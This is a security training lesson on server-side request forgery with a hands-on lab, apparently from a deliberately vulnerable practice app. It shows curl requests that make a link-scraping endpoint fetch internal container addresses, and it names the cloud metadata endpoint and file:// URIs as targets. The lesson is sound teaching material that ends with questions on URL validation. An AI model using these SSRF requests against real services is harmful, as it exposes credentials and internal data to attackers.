# Server Side Request Forgery

Server side request forgery is a nasty vulnerability that allows attackers to see things from the point of view of their victim. For example, if a web server is available to the public and has to access resources in the private network, an SSRF would be an vulnerability that allows an attacker to see or act upon internal services only by interacting with that web server.

This can take multiple forms:

* Cloud server meta-data - Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted
* Database HTTP interfaces - NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data
* Internal REST interfaces
* Files - The attacker may be able to read files using file:// URIs

# Lab

We have an endpoint that will reach out to a website and scrape the HTML for valid links. This is a very common practice for web crawling. You can try it out by running:
```
curl 'http://localhost:8080/links?url=http://wikipedia.com' | jq .
```

When an attacker typically wants to try to exploit a SSRF vulnerability, they will iterate over all internal IPs. They would typically get this list by looking at defaults, such as common VPC networks in AWS such as the `10.0.0.0/24` subnet. How they get the list of internal IPs to iterate over is out of scope for this lesson, but you can obtain a list of IPs to the Docker network by running:

```
$ docker network inspect vulnado_default | jq -r '.[0].Containers[]|.IPv4Address'
172.19.0.2/16
172.19.0.3/16
172.19.0.4/16
```

Once you have this list try to execute a SSRF attack against the endpoint `/links`.

<details>
  <summary>Answer</summary>

  The IP address that worked for you will likely be different, but this lab shows that even though you cannot access the internal site from outside, the web server can. Therefore, using a SSRF attack, you can gain valuable information from this internal site such as a list of internal email addresses.

  ```
  $ curl 'http://localhost:8080/links?url=http://172.19.0.2' | jq .
  [
    "mailto:alice@example.com?subject=feedback",
    "mailto:bob@example.com?subject=feedback",
    "mailto:tom@example.com?subject=feedback",
    "mailto:eve@example.com?subject=feedback"
  ]
  ```

  **Followup question:**
  1. How would we validate the url that is being passed into this function?
  2. Use the `/links-v2` and see if you can still break it.

</details>
